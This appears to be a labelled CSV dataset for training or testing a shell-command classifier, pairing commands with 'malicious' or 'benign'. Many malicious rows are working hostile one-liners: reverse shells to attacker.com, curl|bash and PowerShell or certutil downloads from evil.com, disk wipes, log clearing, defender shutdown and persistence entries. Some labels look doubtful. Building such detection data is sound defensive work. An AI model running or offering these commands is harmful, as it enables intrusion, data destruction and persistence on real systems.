command,label
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
systemctl reload nginx,benign
rsync -av /src/ /dst/,benign
format C: /q /x,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' 2>&1",malicious
usermod -aG sudo user,benign
cp file1.txt file2.txt,benign
sed 's/old/new/g' file.txt 2>/dev/null,benign
nc -l -p 4444 -e /bin/bash >/dev/null,malicious
usermod -aG sudo user,benign
netsh advfirewall set allprofiles state off,malicious
timeout 60 diskpart select disk 0 clean,malicious
systemctl status nginx --help,benign
format C: /q /x,malicious
cmd /c del /q /s C:\*,malicious
ss -tulpn,benign
chown user:group file.txt,benign
timeout 60 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
groups user,benign
python -m http.server 8080,malicious
rmdir empty_folder | head -5,benign
du -sh /var/log,benign
taskkill /f /im antimalware.exe &,malicious
umount /dev/sdb1,benign
sed 's/old/new/g' file.txt 2>/dev/null,benign
last,benign
curl -I https://google.com | head -5,benign
mount > output.txt,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null &",malicious
ncat -lvp 443 -e cmd.exe,malicious
sudo userdel olduser,benign
attrib +h +s malware.exe,malicious
netstat -tulpn,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' &",malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon &,malicious
who,benign
usermod -aG sudo user,benign
ss -tulpn,benign
tail -f /var/log/syslog,benign
ncat -lvp 443 -e cmd.exe &,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null 2>&1",malicious
format C: /q /x,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
man ls,benign
type ls,benign
:(){ :|:& };:,malicious
date,benign
ls -la,benign
mkfs.ext4 /dev/sda1,malicious
cp file1.txt file2.txt -v,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
mshta javascript:alert('code execution'),malicious
echo 'virus' > /etc/passwd,malicious
fdisk -l -v,benign
finger user,benign
wevtutil cl Security >/dev/null,malicious
last,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
find /home -name '*.txt',benign
sdelete -p 10 -s -z C:\ >/dev/null,malicious
iostat -v,benign
systemctl status nginx,benign
wevtutil cl System,malicious
sdelete -p 10 -s -z C:\,malicious
which python,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
passwd user,benign
docker ps,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
"(perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");')",malicious
docker ps 2>/dev/null,benign
uptime,benign
touch newfile.txt,benign
w,benign
nc -l -p 4444 -e /bin/bash &,malicious
diskpart select disk 0 clean,malicious
dd if=/dev/zero of=/dev/sda,malicious
lsblk > output.txt,benign
mkfs.ext4 /dev/sda1,malicious
curl http://evil.com/payload.sh | bash,malicious
node --version,benign
rm -rf / 2>&1,malicious
rm -rf /,malicious
wevtutil cl Security,malicious
mkdir -p /tmp/test 2>/dev/null,benign
sed 's/old/new/g' file.txt,benign
net user hacker password123 /add 2>&1,malicious
sed 's/old/new/g' file.txt,benign
usermod -aG sudo user | head -5,benign
top,benign
dd if=/dev/zero of=/dev/sda,malicious
echo 'virus' > /etc/passwd,malicious
man ls,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
cipher /w:C:\,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
chown user:group file.txt,benign
sc stop Windows Defender &,malicious
history,benign
sudo chown user:group file.txt,benign
uptime,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
apt list --installed,benign
wget https://example.com/file.txt > output.txt,benign
history --help,benign
tail -f /var/log/syslog,benign
timeout 60 powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
ssh user@server.com -v,benign
(wget http://malicious.com/malware.exe),malicious
sed 's/old/new/g' file.txt,benign
echo 'virus' > /etc/passwd,malicious
(cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts),malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
dd if=/dev/zero of=/dev/sda,malicious
useradd newuser,benign
top,benign
pwd -v,benign
lsblk -v,benign
nc -l -p 4444 -e /bin/bash 2>&1,malicious
nohup curl http://evil.com/payload.sh | bash,malicious
diskpart select disk 0 clean,malicious
net user hacker password123 /add,malicious
head -10 logfile.txt,benign
date,benign
taskkill /f /im antimalware.exe,malicious
sudo node --version,benign
umount /dev/sdb1 > output.txt,benign
wevtutil cl Security,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
mv old.txt new.txt,benign
cat /dev/urandom > /dev/sda,malicious
rm -rf /,malicious
service apache2 status,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
systemctl status nginx,benign
pwd | head -5,benign
fdisk -l,benign
mkdir -p /tmp/test -v,benign
systemctl status nginx,benign
passwd user,benign
git pull origin main,benign
traceroute google.com,benign
uptime,benign
id user,benign
:(){ :|:& };: >/dev/null,malicious
sudo git pull origin main,benign
cmd /c del /q /s C:\* 2>&1,malicious
java -version,benign
w,benign
chmod 755 script.sh,benign
history -v,benign
rmdir empty_folder --help,benign
rsync -av /src/ /dst/,benign
mshta javascript:alert('code execution'),malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
timeout 60 bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
:(){ :|:& };:,malicious
wevtutil cl System,malicious
fdisk -l,benign
format C: /q /x,malicious
wget http://malicious.com/malware.exe,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
node --version,benign
nc -l -p 4444 -e /bin/bash,malicious
format C: /q /x,malicious
umount /dev/sdb1 --help,benign
systemctl reload nginx --help,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
sudo ping -c 4 google.com,benign
docker ps,benign
tail -f /var/log/syslog,benign
whoami,benign
format C: /q /x,malicious
timeout 60 bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
cp file1.txt file2.txt,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
whoami,benign
docker images -v,benign
systemctl status nginx | head -5,benign
rm -rf /,malicious
iostat > output.txt,benign
cat /dev/urandom > /dev/sda,malicious
kubectl get pods,benign
"timeout 60 perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
cat /dev/urandom > /dev/sda &,malicious
passwd user,benign
docker ps,benign
ls -la --help,benign
sudo free -m,benign
mount,benign
taskkill /f /im antimalware.exe,malicious
netsh advfirewall set allprofiles state off,malicious
mkdir -p /tmp/test,benign
who,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
free -m --help,benign
wget http://malicious.com/malware.exe,malicious
docker ps,benign
netsh advfirewall set allprofiles state off,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
rsync -av /src/ /dst/,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
uniq sorted.txt,benign
wget https://example.com/file.txt,benign
shutdown /r /f /t 0,malicious
(netsh advfirewall set allprofiles state off),malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
chmod 755 script.sh --help,benign
useradd newuser | head -5,benign
"(awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null)",malicious
sdelete -p 10 -s -z C:\,malicious
fdisk -l 2>/dev/null,benign
wevtutil cl System,malicious
sudo df -h,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
ls -la --help,benign
chmod 777 /etc/shadow,malicious
sudo date,benign
ls -la,benign
ping -c 4 google.com,benign
rm -rf /,malicious
sudo git pull origin main,benign
systemctl status nginx,benign
man ls,benign
which python,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
git clone https://github.com/user/repo.git > output.txt,benign
iostat,benign
nohup dd if=/dev/zero of=/dev/sda,malicious
rmdir empty_folder,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
java -version,benign
last,benign
format C: /q /x,malicious
sed 's/old/new/g' file.txt --help,benign
cipher /w:C:\,malicious
nc -l -p 4444 -e /bin/bash,malicious
top,benign
sdelete -p 10 -s -z C:\,malicious
tar -czf backup.tar.gz /data -v,benign
wget https://example.com/file.txt,benign
nc -l -p 4444 -e /bin/bash,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
mkfs.ext4 /dev/sda1,malicious
cat /etc/passwd,benign
wevtutil cl Security,malicious
python -m http.server 8080,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 &,malicious
who,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
chown user:group file.txt,benign
type ls,benign
vssadmin delete shadows /all /quiet,malicious
format C: /q /x,malicious
taskkill /f /im antimalware.exe,malicious
nohup diskpart select disk 0 clean,malicious
curl -I https://google.com,benign
du -sh /var/log,benign
mkfs.ext4 /dev/sda1,malicious
python -m http.server 8080 2>&1,malicious
netsh advfirewall set allprofiles state off,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon >/dev/null,malicious
vssadmin delete shadows /all /quiet,malicious
cp file1.txt file2.txt -v,benign
touch newfile.txt,benign
head -10 logfile.txt,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
:(){ :|:& };: >/dev/null,malicious
sudo git pull origin main,benign
sed 's/old/new/g' file.txt --help,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
ncat -lvp 443 -e cmd.exe,malicious
userdel olduser,benign
python -m http.server 8080,malicious
python -m http.server 8080,malicious
yum list installed,benign
awk '{print $1}' data.txt,benign
usermod -aG sudo user --help,benign
shutdown /r /f /t 0,malicious
cp file1.txt file2.txt | head -5,benign
wget https://example.com/file.txt,benign
id user | head -5,benign
vmstat,benign
id user 2>/dev/null,benign
ncat -lvp 443 -e cmd.exe,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
shutdown /r /f /t 0,malicious
taskkill /f /im antimalware.exe,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures 2>&1,malicious
cat /etc/passwd,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
rm -rf /,malicious
sudo du -sh /var/log,benign
java -version > output.txt,benign
git clone https://github.com/user/repo.git,benign
echo 'Hello World' > output.txt,benign
groups user,benign
mkfs.ext4 /dev/sda1,malicious
awk '{print $1}' data.txt,benign
npm list,benign
sort data.txt,benign
wevtutil cl System &,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
"timeout 60 python -c 'import os; os.system(""rm -rf /"")'",malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
sudo w,benign
git pull origin main,benign
(cat /dev/urandom > /dev/sda),malicious
rsync -av /src/ /dst/,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
ncat -lvp 443 -e cmd.exe,malicious
scp file.txt user@server:/path/,benign
cat /dev/urandom > /dev/sda,malicious
wc -l document.txt,benign
netsh advfirewall set allprofiles state off,malicious
ssh user@server.com,benign
mshta javascript:alert('code execution'),malicious
type ls,benign
sudo uniq sorted.txt,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
sed 's/old/new/g' file.txt,benign
iptables -L,benign
man ls,benign
chown user:group file.txt,benign
git pull origin main,benign
ncat -lvp 443 -e cmd.exe,malicious
(diskpart select disk 0 clean),malicious
ps aux,benign
awk '{print $1}' data.txt,benign
id user -v,benign
wevtutil cl System,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' >/dev/null",malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
:(){ :|:& };:,malicious
sdelete -p 10 -s -z C:\ &,malicious
sudo scp file.txt user@server:/path/,benign
scp file.txt user@server:/path/ --help,benign
htop,benign
tail -f /var/log/syslog,benign
mount,benign
npm list,benign
iptables -L,benign
attrib +h +s malware.exe,malicious
cp file1.txt file2.txt,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
df -h,benign
nohup netsh advfirewall set allprofiles state off,malicious
docker ps,benign
nc -l -p 4444 -e /bin/bash,malicious
nohup reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
systemctl reload nginx,benign
whoami,benign
"nohup python -c 'import os; os.system(""rm -rf /"")'",malicious
dd if=/dev/zero of=/dev/sda,malicious
sort data.txt,benign
ufw status | head -5,benign
systemctl reload nginx,benign
attrib +h +s malware.exe,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
mount,benign
sudo grep pattern file.txt,benign
groups user,benign
git pull origin main,benign
diskpart select disk 0 clean,malicious
mount,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' &",malicious
"timeout 60 ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
chown user:group file.txt,benign
groups user,benign
service apache2 status,benign
sudo ps aux,benign
history | head -5,benign
wevtutil cl Security &,malicious
sudo passwd user,benign
diskpart select disk 0 clean,malicious
chmod 777 /etc/shadow,malicious
vmstat,benign
npm list,benign
attrib +h +s malware.exe,malicious
vssadmin delete shadows /all /quiet,malicious
sudo apt list --installed,benign
finger user,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
yum list installed | head -5,benign
wevtutil cl System,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon >/dev/null,malicious
which python,benign
attrib +h +s malware.exe,malicious
rmdir empty_folder --help,benign
:(){ :|:& };:,malicious
rsync -av /src/ /dst/,benign
ncat -lvp 443 -e cmd.exe,malicious
finger user --help,benign
wevtutil cl Security,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' &",malicious
git clone https://github.com/user/repo.git,benign
